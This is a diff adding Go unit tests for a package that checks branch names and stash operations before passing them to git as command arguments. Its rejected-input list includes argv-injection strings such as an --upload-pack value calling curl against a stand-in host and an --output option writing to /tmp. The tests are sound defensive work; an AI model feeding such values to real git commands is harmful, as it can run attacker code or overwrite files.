@@ -1,6 +1,10 @@
 package httpapi
 
-import "testing"
+import (
+	"slices"
+	"strings"
+	"testing"
+)
 
 // Validation for the strings this package turns into git argv.
 //
@@ -45,5 +49,83 @@ func TestValidCommitHash(t *testing.T) {
 		if validCommitHash(c.in) {
 			t.Errorf("validCommitHash(%q) = true, want false (%s)", c.in, c.why)
 		}
+	}
+}
+
+func TestValidBranchName(t *testing.T) {
+	valid := []string{
+		"main",
+		"feature/add-widget",
+		"release-1.2",
+		"user/kesokaj/fix",
+		"ünïcode-branch", // git allows non-ASCII; only controls are barred
+		"a",
+	}
+	for _, b := range valid {
+		if !validBranchName(b) {
+			t.Errorf("validBranchName(%q) = false, want true", b)
+		}
+	}
+
+	invalid := []struct{ in, why string }{
+		{"", "empty"},
+		{"-b", "leading dash: git would read it as an option"},
+		{"--output=/tmp/pwn", "leading dash, and an option that WRITES"},
+		{"--upload-pack=curl evil.example", "the classic argv-injection shape"},
+		{"has space", "space is not a legal ref character"},
+		{"nul\x00byte", "NUL"},
+		{"newline\nbranch", "newline could forge a second log line"},
+		{"tab\tbranch", "control byte"},
+		{"esc\x1b[31m", "ANSI escape could rewrite a confirmation dialog"},
+		{"del\x7f", "DEL"},
+		{"c1\x9b", "C1 control"},
+	}
+	for _, c := range invalid {
+		if validBranchName(c.in) {
+			t.Errorf("validBranchName(%q) = true, want false (%s)", c.in, c.why)
+		}
+	}
+
+	// Length is bounded, and the bound is inclusive.
+	if !validBranchName(strings.Repeat("a", maxRefLen)) {
+		t.Errorf("a %d-char name should be accepted", maxRefLen)
+	}
+	if validBranchName(strings.Repeat("a", maxRefLen+1)) {
+		t.Errorf("a %d-char name should be rejected", maxRefLen+1)
+	}
+}
+
+// Names that are merely INVALID as refs are deliberately NOT rejected here —
+// git is the authority on its own ref format, and duplicating those rules in
+// Go would mean silently drifting from a spec we do not own. This test pins
+// that as a decision so nobody "fixes" it into a partial reimplementation.
+func TestValidBranchNameDefersRefFormatToGit(t *testing.T) {
+	deferred := []string{"a..b", "a@{0}", "a.lock", "trailing/", "/leading", "a~1", "a^", "a:b", "a?", "a*", "a["}
+	for _, b := range deferred {
+		if !validBranchName(b) {
+			t.Errorf("validBranchName(%q) = false; ref-format validity is git's "+
+				"call, this gate only stops argv abuse", b)
+		}
+	}
+}
+
+func TestStashOpsIsAClosedSet(t *testing.T) {
+	for _, bad := range []string{"", "drop", "clear", "apply", "branch", "PUSH", "push -u", "--all"} {
+		if _, ok := stashOps[bad]; ok {
+			t.Errorf("stashOps accepted %q; the set must stay closed", bad)
+		}
+	}
+	// `push` must carry -u, or a stash silently strands untracked work.
+	got, ok := stashOps["push"]
+	if !ok {
+		t.Fatal("stashOps lost its push entry")
+	}
+	if !slices.Contains(got, "-u") {
+		t.Errorf("stash push = %v, want it to include -u (untracked files)", got)
+	}
+	// `list` must stay machine-parseable server-side; the frontend must never
+	// be handed raw porcelain to parse.
+	if !slices.Contains(stashOps["list"], "--format=%gd%x00%gs") {
+		t.Errorf("stash list = %v, want a NUL-separated --format", stashOps["list"])
 	}
 }
